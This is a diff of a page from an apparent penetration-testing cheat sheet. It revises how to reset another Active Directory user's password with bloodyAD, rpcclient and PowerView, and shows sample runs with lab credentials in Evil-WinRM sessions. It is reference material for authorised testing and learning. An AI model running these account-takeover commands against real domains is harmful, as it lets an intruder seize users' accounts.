@@ -324,13 +324,14 @@ body.dark-mode #dynamicFormContainer button:hover {
 </style>
   <h3 id="change-target-user-password-from-linux">Change target user password (From Linux)</h3>
 <p>
-<button data-tabset="set1" data-tabcontent="tab1" class="active">BloodyAD</button>
+<button data-tabset="set1" data-tabcontent="tab1" >BloodyAD</button>
 
 <button data-tabset="set1" data-tabcontent="tab2" >rpcclient</button>
 
-<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">python3 bloodyAD.py -d &lt;DOMAIN&gt; -u &lt;USER&gt; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; set password &#39;&lt;TARGET_USER&gt;&#39; &#39;&lt;NEW_PASSWORD&gt;&#39;
-</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span> python3 bloodyAD.py -d object.local -u oliver -p <span class="s1">&#39;c1cdfun_d2434&#39;</span> --host jenkins.object.local <span class="nb">set</span> password smith <span class="s1">&#39;Test1234&#39;</span>
-</span></span><span class="line"><span class="cl"><span class="go">[+] Password changed successfully!
+<div class="tabcontent" data-tabset="set1" data-tabcontent="tab1"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">#</span> Pass password or :hash into PASSWORD
+</span></span><span class="line"><span class="cl"><span class="go">bloodyAD -d &lt;DOMAIN&gt; -u &#39;&lt;USER&gt;&#39; -p &#39;&lt;PASSWORD&gt;&#39; --host &lt;DC&gt; set password &#39;&lt;TARGET_USER&gt;&#39; &#39;&lt;NEW_PASSWORD&gt;&#39;
+</span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">bloodyAD -d object.local -u oliver -p &#39;c1cdfun_d2434&#39; --host jenkins.object.local set password smith &#39;Test1234&#39;
+</span></span></span><span class="line"><span class="cl"><span class="go">[+] Password changed successfully!
 </span></span></span></code></pre></div><p><small><em>Ref: <a href="https://github.com/CravateRouge/bloodyAD">bloodyAD</a></em></small></p></div>
 
 <div class="tabcontent" data-tabset="set1" data-tabcontent="tab2"><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">rpcclient -U &#39;&lt;DOMAIN&gt;/&lt;USER&gt;%&lt;PASSWORD&gt;&#39; &lt;TARGET&gt; -c &#39;setuserinfo2 &lt;TARGET_USER&gt; 23 &lt;NEW_PASSWORD&gt;&#39;
@@ -338,15 +339,19 @@ body.dark-mode #dynamicFormContainer button:hover {
 </span></span></code></pre></div></div></p>
 <h3 id="change-target-user-password-from-windows">Change target user password (From Windows)</h3>
 <p>
-<button data-tabset="set2" data-tabcontent="tab1" class="active">Windows</button>
+<button data-tabset="set2" data-tabcontent="tab1" >Windows</button>
 
 <div class="tabcontent" data-tabset="set2" data-tabcontent="tab1"><h4 id="1-import-powerview">1. Import PowerView</h4>
 <div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">. .\PowerView.ps1
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; . .\PowerView.ps1
-</span></span></span></code></pre></div><h4 id="2-change-target-user-password">2. Change Target User Password</h4>
-<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span> -AsPlainText -Force 
+</span></span></span></code></pre></div><h4 id="2-create-a-cred-object-runas-optional">2. Create a cred object (runas) [optional]</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">username</span> <span class="o">=</span> <span class="s1">&#39;&lt;DOMAIN&gt;\&lt;USER&gt;&#39;</span>
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;&lt;PASSWORD&gt;&#39;</span> -AsPlainText -Force
+</span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">cred</span> <span class="o">=</span> new-object -typename System.Management.Automation.PSCredential -argumentlist <span class="nv">$username</span>, <span class="nv">$password</span>
+</span></span></code></pre></div><h4 id="3-change-target-user-password">3. Change Target User Password</h4>
+<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="gp">$</span><span class="nv">password</span> <span class="o">=</span> ConvertTo-SecureString <span class="s1">&#39;&lt;NEW_PASSWORD&gt;&#39;</span> -AsPlainText -Force
 </span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; $password = ConvertTo-SecureString &#39;Test1234&#39; -AsPlainText -Force
-</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-DomainUserPassword -Identity &lt;TARGET_USER&gt; -AccountPassword $password
+</span></span></span></code></pre></div><div class="highlight"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">Set-DomainUserPassword -Identity &lt;TARGET_USER&gt; -AccountPassword $password -Credential $Cred
 </span></span></span></code></pre></div><div class="highlight sample-code"><pre tabindex="0" class="chroma"><code class="language-console" data-lang="console"><span class="line"><span class="cl"><span class="go">*Evil-WinRM* PS C:\programdata&gt; Set-DomainUserPassword -Identity gibdeon -AccountPassword $password
 </span></span></span></code></pre></div></div></p>
 
